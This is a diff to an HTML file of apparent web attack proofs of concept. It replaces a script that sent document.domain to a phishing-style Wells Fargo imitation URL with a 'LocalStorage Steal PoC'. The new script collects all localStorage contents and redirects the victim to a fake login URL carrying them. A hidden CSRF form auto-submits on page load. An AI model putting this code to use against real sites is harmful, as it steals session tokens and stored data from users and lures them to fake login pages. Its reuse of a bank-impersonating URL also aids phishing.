@@ -2810,22 +2810,32 @@
 	</script>  
 
 <html>
-  <title>CSRF PoC for Document Domain</title>
+  <title>LocalStorage Steal PoC</title>
   <body>
     <script>
-      // Try to access the document.domain
-      try {
-        var docDomain = document.domain;
-        alert('Document Domain: ' + docDomain);  // Display the document domain
+      // Check if there's any data in localStorage
+      if (localStorage.length > 0) {
+        var localStorageData = {};
 
-        // Redirect to a fake login page with captured document.domain as a query parameter
-        var fakeLoginUrl = "https://beastyt350.github.io/wellsfargo.github.io/login.html" + encodeURIComponent(docDomain);
+        // Loop through all keys in localStorage and capture them
+        for (var i = 0; i < localStorage.length; i++) {
+          var key = localStorage.key(i);
+          localStorageData[key] = localStorage.getItem(key);
+        }
+
+        // Capture the data in a variable
+        var capturedData = JSON.stringify(localStorageData);
+
+        // Display the captured data in an alert
+        alert('LocalStorage Data: ' + capturedData);
+
+        // Redirect to a fake login page with captured localStorage data as query parameters
+        var fakeLoginUrl = "https://www.example.com/fake-login?data=" + encodeURIComponent(capturedData);
         
-        // Redirect the user to the fake login page after capturing document.domain
+        // Redirect the user to the fake login page
         window.location.href = fakeLoginUrl;
-      } catch (e) {
-        // If there is an error accessing document.domain due to cross-origin restrictions, show an alert
-        alert('Unable to access document.domain due to cross-origin restrictions. Error: ' + e.message);
+      } else {
+        alert('No data in localStorage!');
       }
     </script>
 
@@ -2845,12 +2855,11 @@
       <input name="debtConCalcDetailsCommandList[3].monthlyPayment" type="hidden" value="10"/>
     </form>
   </body>
-
   <script>
-    // Automatically submit the CSRF form to trigger the request
     document.getElementById("xsrfprobe_csrfpoc").submit();
   </script>
 </html>
+
 
 
 
